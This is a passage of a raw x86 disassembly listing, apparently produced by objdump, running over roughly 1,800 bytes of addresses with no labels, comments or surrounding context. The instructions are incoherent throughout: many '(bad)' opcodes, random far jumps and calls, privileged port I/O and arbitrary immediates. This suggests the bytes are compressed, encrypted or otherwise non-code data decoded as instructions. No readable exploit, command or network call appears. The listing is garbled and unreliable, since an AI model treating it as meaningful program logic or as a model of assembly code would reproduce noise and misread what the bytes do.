  41b5ee:	jns    0x41b662
  41b5f0:	xchg   esp,eax
  41b5f1:	aas    
  41b5f2:	sub    al,0xd4
  41b5f4:	xchg   ebx,eax
  41b5f5:	or     BYTE PTR [edx-0x27de772a],cl
  41b5fb:	addr16 jge 0x41b623
  41b5fe:	jbe    0x41b613
  41b600:	xchg   DWORD PTR [esi-0x12b5459c],ebp
  41b606:	dec    edx
  41b607:	xchg   edi,eax
  41b608:	shr    DWORD PTR [esi-0x600a5b43],0x53
  41b60f:	pop    esp
  41b610:	jg     0x41b605
  41b612:	imul   ebp,DWORD PTR [esi+0x49661e3],0x954388f4
  41b61c:	(bad)  
  41b61d:	sahf   
  41b61e:	inc    esi
  41b61f:	lock xor bh,BYTE PTR [ebp+0x7e26d52b]
  41b626:	dec    ebx
  41b627:	adc    BYTE PTR [ebx+0x9],0x3d
  41b62b:	inc    ebp
  41b62c:	test   edx,edx
  41b62e:	popa   
  41b62f:	or     BYTE PTR [ebp+0x38642e32],bl
  41b635:	loopne 0x41b6a3
  41b637:	shl    BYTE PTR [eax],cl
  41b639:	(bad)  
  41b63a:	call   0xac46:0x2477734a
  41b641:	punpckldq mm2,mm2
  41b644:	add    ecx,ebx
  41b646:	and    ecx,DWORD PTR [esi+0x1f0b0386]
  41b64c:	or     eax,0x21990315
  41b651:	xchg   ecx,eax
  41b652:	add    al,0x8d
  41b654:	push   esi
  41b655:	fxch   st(7)
  41b657:	mov    WORD PTR [ecx-0x1f9c481b],es
  41b65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b65e:	imul   esi,DWORD PTR [ecx],0x79ff0169
  41b664:	jo     0x41b6b9
  41b666:	add    edi,DWORD PTR [ebx]
  41b668:	fisub  WORD PTR [eax-0x41b3382b]
  41b66e:	jo     0x41b60c
  41b670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b671:	loope  0x41b6b7
  41b673:	hlt    
  41b674:	test   DWORD PTR ds:0x913943a0,eax
  41b67a:	aam    0x6
  41b67c:	repz sti 
  41b67e:	(bad)  
  41b67f:	mov    cl,0x96
  41b681:	pop    ebp
  41b682:	fwait
  41b683:	and    DWORD PTR [eax-0x7d3532de],0x4ba838f8
  41b68d:	hlt    
  41b68e:	jge    0x41b6ab
  41b690:	push   ebx
  41b691:	mov    ebp,0xca33b23e
  41b696:	push   ecx
  41b697:	aad    0x2b
  41b699:	jno    0x41b622
  41b69b:	arpl   WORD PTR [ebp+eax*8-0x6981eadb],ax
  41b6a2:	sub    eax,0x1942eea3
  41b6a7:	jbe    0x41b63b
  41b6a9:	sahf   
  41b6aa:	addr16 sahf 
  41b6ac:	rcl    dl,cl
  41b6ae:	lods   al,BYTE PTR ds:[esi]
  41b6af:	sbb    al,0x77
  41b6b1:	cli    
  41b6b2:	loopne 0x41b680
  41b6b4:	cs loope 0x41b685
  41b6b7:	or     bl,ch
  41b6b9:	mov    esi,0x6925cfad
  41b6be:	fidivr DWORD PTR [ebx+0x4d]
  41b6c1:	bound  ebp,QWORD PTR [ecx-0x41]
  41b6c4:	stos   BYTE PTR es:[edi],al
  41b6c5:	push   ecx
  41b6c6:	xor    esi,edi
  41b6c8:	mov    dl,0xbb
  41b6ca:	int    0xef
  41b6cc:	adc    DWORD PTR [ebx+0x2b],edx
  41b6cf:	xchg   DWORD PTR [esi],esp
  41b6d1:	scas   al,BYTE PTR es:[edi]
  41b6d2:	jmp    0x41b70b
  41b6d4:	push   0xffffffd5
  41b6d6:	jnp    0x41b65e
  41b6d8:	dec    esi
  41b6d9:	push   eax
  41b6da:	sti    
  41b6db:	stc    
  41b6dc:	xchg   ebx,eax
  41b6dd:	test   BYTE PTR [ebp-0xd],bh
  41b6e0:	dec    ecx
  41b6e1:	sub    BYTE PTR [ebx-0x7],ah
  41b6e4:	inc    ecx
  41b6e5:	pop    es
  41b6e6:	add    BYTE PTR [eax+0x2e0e4999],al
  41b6ec:	xchg   esp,eax
  41b6ed:	jns    0x41b72a
  41b6ef:	aam    0xaf
  41b6f1:	mov    ds:0x877365cf,al
  41b6f6:	push   esp
  41b6f7:	adc    al,0x33
  41b6f9:	pop    eax
  41b6fa:	retf   
  41b6fb:	pop    esp
  41b6fc:	outs   dx,DWORD PTR ds:[esi]
  41b6fd:	pushf  
  41b6fe:	enter  0x3b18,0x72
  41b702:	cmp    al,0x7e
  41b704:	and    DWORD PTR [ebx+eiz*8],0x2d
  41b708:	sub    edi,ebx
  41b70a:	mov    ecx,0x3e532416
  41b70f:	ret    0xbf01
  41b712:	loopne 0x41b71f
  41b714:	imul   esi,DWORD PTR ds:0x6527cd5,0x9
  41b71b:	frstor [esi+0x39]
  41b71e:	pop    esp
  41b71f:	xchg   edx,eax
  41b720:	fs dec edx
  41b722:	bound  ebp,QWORD PTR [ecx+eiz*1+0x59d66389]
  41b729:	sbb    eax,0xebd5d335
  41b72e:	dec    ecx
  41b72f:	sub    eax,0xcff38db4
  41b734:	sahf   
  41b735:	out    dx,al
  41b736:	inc    edx
  41b737:	sbb    dh,BYTE PTR [ebp+0x20]
  41b73a:	daa    
  41b73b:	lods   al,BYTE PTR ds:[esi]
  41b73c:	mul    DWORD PTR [esi+0x1b]
  41b73f:	in     al,0x90
  41b741:	sbb    BYTE PTR [ebx-0x66dcf505],0xc
  41b748:	sub    BYTE PTR [esi],dl
  41b74a:	inc    ebp
  41b74b:	rcl    BYTE PTR [ebp+0x50afc3e2],cl
  41b751:	add    ah,BYTE PTR [edi+0x54]
  41b754:	xchg   esp,eax
  41b755:	loop   0x41b6d7
  41b757:	shl    BYTE PTR [ebx+eiz*8+0x262e12bc],1
  41b75e:	add    cl,BYTE PTR [esi]
  41b760:	or     DWORD PTR [ecx-0x37],eax
  41b763:	ror    esp,cl
  41b765:	push   edx
  41b766:	mov    edi,0xbf7189c7
  41b76b:	aam    0xb6
  41b76d:	push   ds
  41b76e:	mov    WORD PTR [ebx],?
  41b770:	xchg   edx,eax
  41b771:	icebp  
  41b772:	xor    BYTE PTR [edi+ebx*2-0x6f],bl
  41b776:	aam    0x74
  41b778:	mov    al,0x73
  41b77a:	push   ebx
  41b77b:	clc    
  41b77c:	xchg   ecx,ebp
  41b77e:	push   esi
  41b77f:	dec    ecx
  41b780:	aas    
  41b781:	fs jmp 0x23b1:0xeb7615c6
  41b789:	cmp    al,0x6e
  41b78b:	push   edx
  41b78c:	xchg   edx,eax
  41b78d:	jno    0x41b78d
  41b78f:	ins    BYTE PTR es:[edi],dx
  41b790:	mov    bl,0x34
  41b792:	mov    ?,edx
  41b794:	(bad)  
  41b795:	push   cs
  41b796:	mov    esp,0xac770af1
  41b79b:	rol    BYTE PTR [edx+0x7a68e544],0x96
  41b7a2:	cld    
  41b7a3:	xchg   esp,eax
  41b7a4:	add    DWORD PTR [ecx-0x5ef19b29],ebp
  41b7aa:	xlat   BYTE PTR ds:[ebx]
  41b7ab:	xchg   ebx,eax
  41b7ac:	cmp    al,0x9e
  41b7ae:	(bad)  [edi+ebp*2-0x7d]
  41b7b2:	inc    edi
  41b7b3:	enter  0x3154,0x2a
  41b7b7:	xchg   esi,eax
  41b7b8:	int    0xe9
  41b7ba:	mov    eax,0x889ba94f
  41b7bf:	adc    ah,0x4f
  41b7c2:	dec    ebx
  41b7c3:	daa    
  41b7c4:	push   ebp
  41b7c5:	mov    DWORD PTR [eax-0x2d],ecx
  41b7c8:	(bad)  
  41b7c9:	repz xor eax,0x88a6e7a6
  41b7cf:	cmp    DWORD PTR [ebp+0x22],edx
  41b7d2:	in     al,dx
  41b7d3:	mov    ah,0xfe
  41b7d5:	jle    0x41b79d
  41b7d7:	sub    al,0xa
  41b7d9:	bnd je 0x41b829
  41b7dc:	iret   
  41b7dd:	mov    esp,es
  41b7df:	fstp   TBYTE PTR [esi+0xb]
  41b7e2:	fcomp  DWORD PTR [ebp+0x13cbae7d]
  41b7e8:	or     eax,0x7e241f22
  41b7ed:	rol    bl,1
  41b7ef:	jge    0x41b80b
  41b7f1:	sbb    eax,0xf56f850f
  41b7f6:	lods   al,BYTE PTR ds:[esi]
  41b7f7:	and    edi,DWORD PTR [ebp+0x697ebdba]
  41b7fd:	xchg   ebx,eax
  41b7fe:	cmc    
  41b7ff:	ins    BYTE PTR es:[edi],dx
  41b800:	mov    ss,WORD PTR [edx+0x6a]
  41b803:	lock aaa 
  41b805:	xor    BYTE PTR [esp+ebp*4+0x7448130e],ah
  41b80c:	outs   dx,BYTE PTR ds:[esi]
  41b80d:	out    0xfb,eax
  41b80f:	pop    edi
  41b810:	dec    esi
  41b811:	jo     0x41b797
  41b813:	cmp    BYTE PTR [edi],0x86
  41b816:	jle    0x41b7ea
  41b818:	cli    
  41b819:	in     al,0x5c
  41b81b:	imul   esp,DWORD PTR [ebp-0x3b],0x63
  41b81f:	imul   esi,DWORD PTR [eax+0x53d427f7],0xbde040ee
  41b829:	mov    ds:0xc695452f,al
  41b82e:	inc    esi
  41b82f:	jno    0x41b7dd
  41b831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b832:	jnp    0x41b89a
  41b834:	arpl   sp,sp
  41b836:	and    BYTE PTR [ebp+eax*4+0x14ff1b46],dl
  41b83d:	xchg   BYTE PTR [edx+esi*4-0x4e],bh
  41b841:	rcr    DWORD PTR [edi],0x77
  41b844:	popa   
  41b845:	ins    BYTE PTR es:[edi],dx
  41b846:	sbb    ebx,esi
  41b848:	(bad)  
  41b849:	out    0x83,al
  41b84b:	imul   ecx,DWORD PTR [ecx],0xffffffd1
  41b84e:	inc    edx
  41b84f:	push   edx
  41b850:	xor    ch,BYTE PTR [esi]
  41b852:	jns    0x41b847
  41b854:	xchg   BYTE PTR [ebx+0x6c79ee5c],bh
  41b85a:	(bad)  
  41b85b:	arpl   si,si
  41b85d:	outs   dx,BYTE PTR ds:[esi]
  41b85e:	push   esi
  41b85f:	dec    ebp
  41b860:	sbb    eax,DWORD PTR [eax+0x1479b3e3]
  41b866:	imul   edx,DWORD PTR [esi],0x76
  41b869:	aas    
  41b86a:	push   ebx
  41b86b:	jmp    0xd638c71d
  41b870:	push   ds
  41b871:	enter  0x4eb2,0xc0
  41b875:	push   eax
  41b876:	lahf   
  41b877:	in     al,0xc9
  41b879:	jnp    0x41b872
  41b87b:	scas   al,BYTE PTR es:[edi]
  41b87c:	call   0x3ddf:0xf08db8b0
  41b883:	js     0x41b880
  41b885:	xor    DWORD PTR [ebx-0xd8fdfdc],ecx
  41b88b:	mov    eax,0x109384bd
  41b890:	(bad)  
  41b891:	sub    edx,DWORD PTR [ecx-0x33e8d9c]
  41b897:	adc    al,0xf9
  41b899:	into   
  41b89a:	cmp    esi,DWORD PTR [ebp-0x6b85979c]
  41b8a0:	cmp    ah,BYTE PTR [edx]
  41b8a2:	(bad)  [eax]
  41b8a4:	jmp    0xfc7bc47
  41b8a9:	outs   dx,BYTE PTR ds:[esi]
  41b8aa:	call   0x5ca1:0xd6a05ea4
  41b8b1:	mov    dh,0x95
  41b8b3:	or     dl,dh
  41b8b5:	(bad)  
  41b8b6:	mov    esi,0x1dabdf6f
  41b8bb:	adc    eax,0xdfcb0ebf
  41b8c0:	mov    ebx,0x51a9d391
  41b8c5:	leave  
  41b8c6:	dec    ebx
  41b8c7:	out    0x28,eax
  41b8c9:	pushf  
  41b8ca:	sar    BYTE PTR [bp-0x6096],1
  41b8cf:	sbb    ebp,eax
  41b8d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8d2:	dec    esi
  41b8d3:	fld    QWORD PTR [ebx-0x47ab0f7e]
  41b8d9:	clc    
  41b8da:	sar    DWORD PTR [edi],cl
  41b8dc:	or     BYTE PTR [ebx],al
  41b8de:	dec    ecx
  41b8df:	leave  
  41b8e0:	mov    esp,0x859cbbed
  41b8e5:	sub    BYTE PTR [eax-0x13],dh
  41b8e8:	fs xor bh,al
  41b8eb:	js     0x41b919
  41b8ed:	scas   al,BYTE PTR es:[edi]
  41b8ee:	mov    ah,0x44
  41b8f0:	mov    ebp,0x425724b4
  41b8f5:	mov    eax,ds:0x4eb43883
  41b8fa:	xor    BYTE PTR [bp+0x5c27],ch
  41b8ff:	daa    
  41b900:	in     al,0xf6
  41b902:	retf   
  41b903:	xlat   BYTE PTR ds:[ebx]
  41b904:	test   al,0xcf
  41b906:	clc    
  41b907:	or     eax,esi
  41b909:	lds    ebp,FWORD PTR [eax]
  41b90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b90c:	push   ss
  41b90d:	and    ah,bh
  41b90f:	and    eax,0x53cf42f7
  41b914:	dec    ecx
  41b915:	jno    0x41b8cc
  41b917:	add    ebx,DWORD PTR [edx-0x6a9cdaf3]
  41b91d:	iret   
  41b91e:	pop    es
  41b91f:	push   ss
  41b920:	mov    ch,0x4f
  41b922:	pop    esi
  41b923:	in     eax,dx
  41b924:	lock ss mov edi,0x32f32522
  41b92b:	inc    eax
  41b92c:	(bad)  
  41b92d:	out    0x95,al
  41b92f:	lods   eax,DWORD PTR ds:[esi]
  41b930:	daa    
  41b931:	mov    ebp,0x824e6ae3
  41b936:	dec    esp
  41b937:	pop    edi
  41b938:	xor    bl,BYTE PTR [ebx]
  41b93a:	mov    bh,0xee
  41b93c:	ins    BYTE PTR es:[edi],dx
  41b93d:	mov    dh,0x48
  41b93f:	into   
  41b940:	mov    ds:0x2ab1af22,eax
  41b945:	pop    edx
  41b946:	pop    eax
  41b947:	mov    ds:0xeca831b6,eax
  41b94c:	rcl    BYTE PTR [ebx+0x26],cl
  41b94f:	(bad)  
  41b950:	popa   
  41b951:	arpl   WORD PTR [ecx-0x3f535c58],di
  41b957:	test   eax,0x25a7b408
  41b95c:	lods   eax,DWORD PTR ds:[esi]
  41b95d:	dec    esp
  41b95e:	pop    ds
  41b95f:	push   eax
  41b960:	jmp    0xd2bd:0x55e50493
  41b967:	stos   DWORD PTR es:[edi],eax
  41b968:	mov    ds:0x96b7d98,eax
  41b96d:	cmp    BYTE PTR [eax],0xd3
  41b970:	in     al,0xcc
  41b972:	cmp    al,0x4b
  41b974:	shl    eax,0x49
  41b977:	jbe    0x41b96d
  41b979:	arpl   WORD PTR [ecx+0x2f],bp
  41b97c:	out    0x94,eax
  41b97e:	jmp    0x1285345f
  41b983:	mov    ch,bl
  41b985:	xor    eax,0x70e205a7
  41b98a:	leave  
  41b98b:	or     al,BYTE PTR [eax]
  41b98d:	adc    DWORD PTR [ebp+0x799a235],ebx
  41b993:	xor    al,0x11
  41b995:	repnz xor edi,DWORD PTR fs:[ecx-0x47]
  41b99a:	loop   0x41b98b
  41b99c:	pop    esp
  41b99d:	inc    esi
  41b99e:	lock inc sp
  41b9a1:	ret    
  41b9a2:	sub    ch,BYTE PTR [eax-0x29]
  41b9a5:	aad    0x3a
  41b9a7:	pop    esp
  41b9a8:	loope  0x41b9e8
  41b9aa:	or     eax,0x76d5f963
  41b9af:	adc    BYTE PTR [esi+0x2c],bl
  41b9b2:	(bad)  
  41b9b3:	mov    ah,0x3
  41b9b5:	das    
  41b9b6:	sbb    bl,BYTE PTR [edx]
  41b9b8:	xor    DWORD PTR [edx-0x6f],0x85e77e5c
  41b9bf:	cmp    eax,0x8f09c7c8
  41b9c4:	or     al,0xf
  41b9c6:	sbb    al,0xc9
  41b9c8:	into   
  41b9c9:	(bad)  
  41b9cb:	int3   
  41b9cc:	jp     0x41b972
  41b9ce:	push   esp
  41b9cf:	sub    al,0xda
  41b9d1:	in     eax,0xac
  41b9d3:	stos   BYTE PTR es:[edi],al
  41b9d4:	mov    ebx,0x5f6fbd67
  41b9d9:	(bad)  
  41b9da:	mov    eax,0x511bcbbb
  41b9df:	test   eax,0x6ee5b07f
  41b9e4:	popa   
  41b9e5:	fstp   QWORD PTR [ebx]
  41b9e7:	stos   DWORD PTR es:[edi],eax
  41b9e8:	or     BYTE PTR [edi],al
  41b9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9eb:	mov    cl,0xc7
  41b9ed:	push   ebx
  41b9ee:	imul   esp,DWORD PTR [ecx+eiz*1],0x7135d354
  41b9f5:	jle    0x41ba70
  41b9f7:	mov    esi,0xb54fc62
  41b9fc:	pop    ebx
  41b9fd:	jns    0x41b98c
  41b9ff:	daa    
  41ba00:	ss mov dh,0x37
  41ba03:	shl    DWORD PTR [edi+eiz*1+0x73],cl
  41ba07:	inc    ebx
  41ba08:	mov    al,0x60
  41ba0a:	test   al,0xd6
  41ba0c:	and    eax,0x2acf34f8
  41ba11:	mov    eax,ds:0xfb1b934a
  41ba16:	mov    edx,0xb7a5e9a
  41ba1b:	retf   0x9160
  41ba1e:	mov    dl,0xb2
  41ba20:	xor    al,0x65
  41ba22:	mov    ah,0x21
  41ba24:	push   ecx
  41ba25:	xor    DWORD PTR [ebp-0x18],esi
  41ba28:	pop    es
  41ba29:	out    0x7b,eax
  41ba2b:	or     cl,BYTE PTR [ebp+0x64]
  41ba2e:	iret   
  41ba2f:	jns    0x41ba60
  41ba31:	sbb    DWORD PTR [esp+ebx*1-0x6bb74f73],ebx
  41ba38:	and    eax,0xd3f1ceb7
  41ba3d:	cmp    DWORD PTR [edx+0x551248e1],esp
  41ba43:	div    DWORD PTR [edi]
  41ba45:	or     ah,BYTE PTR [ebp-0x34]
  41ba48:	sti    
  41ba49:	add    ecx,DWORD PTR [ebx-0x28]
  41ba4c:	dec    eax
  41ba4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba4e:	inc    ecx
  41ba4f:	and    cl,BYTE PTR [edx]
  41ba51:	add    BYTE PTR fs:[ebp+0x71a040f1],al
  41ba58:	mov    bh,0x8
  41ba5a:	xor    DWORD PTR [edi+0x7e],esi
  41ba5d:	stos   BYTE PTR es:[edi],al
  41ba5e:	ss xchg esp,eax
  41ba60:	std    
  41ba61:	cmp    al,BYTE PTR [eax]
  41ba63:	add    cl,BYTE PTR [ecx+esi*2]
  41ba66:	loop   0x41ba26
  41ba68:	pop    esp
  41ba69:	in     eax,0xa5
  41ba6b:	cmp    edi,DWORD PTR [ecx+0x25236182]
  41ba71:	(bad)  
  41ba73:	sbb    cl,BYTE PTR [eax]
  41ba75:	cmp    BYTE PTR [edi+0x3f],ch
  41ba78:	nop
  41ba79:	sbb    DWORD PTR [ecx-0x7fd5ded2],esp
  41ba7f:	std    
  41ba80:	std    
  41ba81:	adc    dl,BYTE PTR [ebp+0x26a1513d]
  41ba87:	loope  0x41bab7
  41ba89:	pop    ebp
  41ba8a:	xchg   ebp,eax
  41ba8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba8c:	jp     0x41bad0
  41ba8e:	add    DWORD PTR [esi+eiz*1],edi
  41ba91:	ins    BYTE PTR es:[edi],dx
  41ba92:	cld    
  41ba93:	fucomip st,st(2)
  41ba95:	sub    BYTE PTR [esp+eax*1+0x32],al
  41ba99:	shl    esp,0x61
  41ba9c:	les    esp,FWORD PTR [edi+esi*2]
  41ba9f:	cwde   
  41baa0:	jne    0x41bacb
  41baa2:	push   es
  41baa3:	daa    
  41baa4:	out    0x39,al
  41baa6:	adc    DWORD PTR [eax],esi
  41baa8:	stos   DWORD PTR es:[edi],eax
  41baa9:	ds out 0x7a,al
  41baac:	xlat   BYTE PTR ds:[ebx]
  41baad:	jl     0x41bb1e
  41baaf:	fcom   DWORD PTR [ecx]
  41bab1:	(bad)  
  41bab2:	mov    ebx,fs
  41bab4:	pop    esp
  41bab5:	pusha  
  41bab6:	and    BYTE PTR [edi+ebp*8+0x7a],dl
  41baba:	test   al,0x71
  41babc:	(bad)  
  41babd:	shr    BYTE PTR [ecx],1
  41babf:	inc    esi
  41bac0:	jb     0x41bada
  41bac2:	arpl   WORD PTR [ebp-0x52],si
  41bac5:	ja     0x41bb14
  41bac7:	or     eax,0xb2feda74
  41bacc:	dec    eax
  41bacd:	cmp    eax,DWORD PTR [edi]
  41bacf:	call   0xfca3cef5
  41bad4:	inc    ecx
  41bad5:	pop    ss
  41bad6:	adc    al,0x95
  41bad8:	daa    
  41bad9:	out    dx,al
  41bada:	outs   dx,DWORD PTR ds:[esi]
  41badb:	pop    edi
  41badc:	call   0x7335c97b
  41bae1:	ror    DWORD PTR [esi+0x4b2176b7],0xf3
  41bae8:	not    BYTE PTR [edi+0x48748ffc]
  41baee:	arpl   WORD PTR [ebx+0x22],dx
  41baf1:	test   BYTE PTR [ebp-0x2ac8ae0e],dl
  41baf7:	push   ebp
  41baf8:	pop    esi
  41baf9:	scas   eax,DWORD PTR es:[edi]
  41bafa:	ret    
  41bafb:	nop
  41bafc:	scas   al,BYTE PTR es:[edi]
  41bafd:	jp     0x41bab6
  41baff:	scas   al,BYTE PTR es:[edi]
  41bb00:	fst    QWORD PTR [edx+ecx*1]
  41bb03:	mov    dh,0xb3
  41bb05:	arpl   WORD PTR [esi],di
  41bb07:	jmp    0x486d:0x2c04accd
  41bb0e:	pop    esi
  41bb0f:	repnz push ebx
  41bb11:	imul   eax,eax,0x19
  41bb14:	ja     0x41bb3c
  41bb16:	js     0x41bae9
  41bb18:	or     ebx,DWORD PTR [ebx+eax*8-0x284f1416]
  41bb1f:	mov    eax,0x528313a9
  41bb24:	loope  0x41bae5
  41bb26:	jg     0x41bb34
  41bb28:	add    BYTE PTR [eax],bh
  41bb2a:	mov    al,ah
  41bb2c:	es stos DWORD PTR es:[edi],eax
  41bb2e:	pop    eax
  41bb2f:	add    eax,0x46aef343
  41bb34:	mov    ebp,DWORD PTR [esi]
  41bb36:	retf   
  41bb37:	pop    ecx
  41bb38:	in     eax,dx
  41bb39:	imul   ebx,esp,0x75319b9b
  41bb3f:	add    esi,DWORD PTR [ebx-0x73095bc9]
  41bb45:	sub    ah,ah
  41bb47:	xor    BYTE PTR [ebx+0x602756cf],cl
  41bb4d:	cdq    
  41bb4e:	ror    BYTE PTR [ebp-0x36],cl
  41bb51:	push   esp
  41bb52:	mov    bl,0x2c
  41bb54:	pop    ebp
  41bb55:	adc    edx,ecx
  41bb57:	cmp    BYTE PTR [ebx-0x34],bh
  41bb5a:	in     al,dx
  41bb5b:	sbb    edx,DWORD PTR [ecx+0x44]
  41bb5e:	test   eax,0xd74b2aa5
  41bb63:	mov    dl,0x2
  41bb65:	cmp    DWORD PTR [ecx+ecx*1],edx
  41bb68:	xlat   BYTE PTR ds:[ebx]
  41bb69:	jbe    0x41bb5f
  41bb6b:	xor    cl,BYTE PTR [edx-0x13]
  41bb6e:	rcr    BYTE PTR [esp+edi*1],0x34
  41bb72:	adc    ah,bh
  41bb74:	jg     0x41bb92
  41bb76:	push   esp
  41bb77:	ret    
  41bb78:	mov    dh,0x61
  41bb7a:	pop    ecx
  41bb7b:	push   edx
  41bb7c:	in     al,dx
  41bb7d:	or     al,0x2d
  41bb7f:	test   ah,cl
  41bb81:	fisubr DWORD PTR [esi-0x4f94fc63]
  41bb87:	out    0x17,eax
  41bb89:	pop    ecx
  41bb8a:	mov    ebx,0x254877cf
  41bb8f:	mov    dh,dh
  41bb91:	adc    BYTE PTR [esi-0x5c735924],bl
  41bb97:	pop    esp
  41bb98:	mov    al,0x2c
  41bb9a:	fnstenv [esi+0x12c72228]
  41bba0:	add    al,0x28
  41bba2:	jne    0x41bba9
  41bba4:	mul    edi
  41bba6:	sub    al,0x1c
  41bba8:	in     al,dx
  41bba9:	(bad)  
  41bbaa:	mov    cx,0x8df
  41bbae:	scas   al,BYTE PTR es:[edi]
  41bbaf:	pop    eax
  41bbb0:	mov    DWORD PTR [esp+ebx*1-0xd],ebx
  41bbb4:	cmp    eax,0xede7f879
  41bbb9:	sahf   
  41bbba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbbb:	mov    al,ds:0x4dd8d763
  41bbc0:	loopne 0x41bbf4
  41bbc2:	push   eax
  41bbc3:	adc    BYTE PTR es:[ebp+0x5f],bl
  41bbc7:	gs (bad) 
  41bbc9:	(bad)  
  41bbca:	lds    esp,FWORD PTR [ecx]
  41bbcc:	jge    0x41bbf4
  41bbce:	out    dx,eax
  41bbcf:	adc    al,0xab
  41bbd1:	sub    eax,0xbae63e3f
  41bbd6:	jno    0x41bbe3
  41bbd8:	mov    ds:0xad6c997e,al
  41bbdd:	add    edx,edx
  41bbdf:	jle    0x41bbb4
  41bbe1:	nop
  41bbe2:	sbb    esi,DWORD PTR [ebx]
  41bbe4:	imul   esp,DWORD PTR [ebp+0x5b],0xe
  41bbe8:	mov    esi,0xddd7d35
  41bbed:	in     al,0xc
  41bbef:	mov    al,ds:0xb746e84c
  41bbf4:	sub    BYTE PTR [edx+0x2b],0xbd
  41bbf8:	mov    dh,BYTE PTR [edi-0x73]
  41bbfb:	mov    ebp,eax
  41bbfd:	arpl   WORD PTR [edi-0x6da0f1de],ax
  41bc03:	mov    ds:0x73a33747,eax
  41bc08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc09:	mov    al,ds:0x4dc5381e
  41bc0e:	xchg   ecx,eax
  41bc0f:	jbe    0x41bbdd
  41bc11:	jae    0x41bc5e
  41bc13:	or     al,0xb7
  41bc15:	fisub  DWORD PTR [ecx+0x64]
  41bc18:	bound  ecx,QWORD PTR [edx-0x49]
  41bc1b:	out    0x14,al
  41bc1d:	sbb    DWORD PTR [esi-0x3f],esi
  41bc20:	mov    dh,0x99
  41bc22:	ins    DWORD PTR es:[edi],dx
  41bc23:	xchg   cl,dh
  41bc25:	sub    dh,ch
  41bc27:	xchg   edi,eax
  41bc28:	xchg   DWORD PTR [edi],ebx
  41bc2a:	stc    
  41bc2b:	xchg   edi,eax
  41bc2c:	cli    
  41bc2d:	iret   
  41bc2e:	mov    edi,0xab9fb021
  41bc33:	lea    edx,[edi]
  41bc35:	pop    esp
  41bc36:	daa    
  41bc37:	inc    ecx
  41bc38:	aas    
  41bc39:	push   eax
  41bc3b:	jmp    0x33b31c52
  41bc40:	gs aam 0x4b
  41bc43:	jmp    0x10ab04ae
  41bc48:	out    0x65,al
  41bc4a:	shr    DWORD PTR [edx-0x68a1a060],1
  41bc50:	mov    WORD PTR [ebx+0x658902d6],fs
  41bc56:	test   al,0xe
  41bc58:	mov    ds:0xdbf6d35d,al
  41bc5d:	mov    ecx,0x582a48bf
  41bc62:	leave  
  41bc63:	idiv   DWORD PTR [ecx+ebx*1+0x63c1143f]
  41bc6a:	sub    BYTE PTR [esi-0x397b04a5],al
  41bc70:	movd   mm5,DWORD PTR [edi]
  41bc73:	out    0xcc,al
  41bc75:	scas   al,BYTE PTR es:[edi]
  41bc76:	test   bh,dl
  41bc78:	xor    eax,0x9ad9ae2f
  41bc7d:	dec    edx
  41bc7e:	xor    esi,0xffffffea
  41bc81:	in     al,dx
  41bc82:	push   ss
  41bc83:	jl     0x41bc11
  41bc85:	adc    al,0x11
  41bc87:	adc    dh,BYTE PTR gs:[edi+0x53e9fb0c]
  41bc8e:	loope  0x41bd0a
  41bc90:	addr16 (bad) 
  41bc92:	push   ss
  41bc93:	pushf  
  41bc94:	fdiv   QWORD PTR [bx+0x3b]
  41bc98:	repnz repnz daa 
  41bc9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc9c:	dec    ecx
  41bc9d:	pusha  
  41bc9e:	push   ebx
  41bc9f:	or     ah,ah
  41bca1:	ja     0x41bc92
  41bca3:	add    DWORD PTR [eax-0xd70b75e],eax
  41bca9:	sbb    edx,DWORD PTR [ebp+0x4a]
  41bcac:	mov    bl,0xea
  41bcae:	fcom   st(4)
  41bcb0:	daa    
  41bcb1:	cmc    
  41bcb2:	add    al,0x99
  41bcb4:	dec    esp
  41bcb5:	ret    
  41bcb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcb7:	fist   WORD PTR [ebp+eax*1+0x46]
  41bcbb:	dec    ecx
  41bcbc:	lea    esi,[ecx]
  41bcbe:	ret    0x5d04
  41bcc1:	xlat   BYTE PTR ds:[ebx]
  41bcc2:	and    edi,ecx
  41bcc4:	push   es
  41bcc5:	(bad)  
  41bcc6:	loope  0x41bc59
  41bcc8:	and    al,0x10
  41bcca:	dec    edx
  41bccb:	pop    ebx
  41bccc:	xor    DWORD PTR [ecx],ecx
  41bcce:	xchg   ecx,eax
  41bccf:	jmp    0x41bcc1
  41bcd1:	sbb    DWORD PTR [esi+0x3ca4a164],edx
  41bcd7:	xlat   BYTE PTR ds:[ebx]
  41bcd8:	(bad)  
  41bcdb:	retf   
  41bcdc:	js     0x41bcf2
  41bcde:	jne    0x41bcaf
  41bce0:	push   esp
  41bce1:	stc    
  41bce2:	and    al,0xe
  41bce4:	mov    ds:0x9cb318f6,eax
  41bce9:	or     ebx,eax
  41bceb:	lock push ebp
  41bced:	add    eax,0x1cb648b6
  41bcf2:	fsub   QWORD PTR [edi-0x1975c3d4]
  41bcf8:	cmp    ax,0xe4db
  41bcfc:	pop    edx
  41bcfd:	jp     0x41bd3e
  41bcff:	fs inc eax
  41bd01:	stos   DWORD PTR es:[edi],eax
  41bd02:	cmp    BYTE PTR [edi-0x3490e44d],al
  41bd08:	inc    esi
  41bd09:	je     0x41bd17
  41bd0b:	out    dx,al
  41bd0c:	fwait
  41bd0d:	sete   bh
  41bd10:	mov    DWORD PTR [ebx],ebp
  41bd12:	push   edi
  41bd13:	jmp    FWORD PTR [eax-0x41eb1f72]
  41bd19:	popa   
  41bd1a:	(bad)  
  41bd1b:	cmp    bh,ah
  41bd1d:	jle    0x41bd8e
  41bd1f:	adc    ebp,DWORD PTR [ebx+edx*4]
  41bd22:	aas    
  41bd23:	jle    0x41bd43
  41bd25:	dec    ecx
  41bd26:	add    ah,bh
  41bd28:	xchg   esp,eax
  41bd29:	cmp    eax,0x877002b1
  41bd2e:	inc    esi
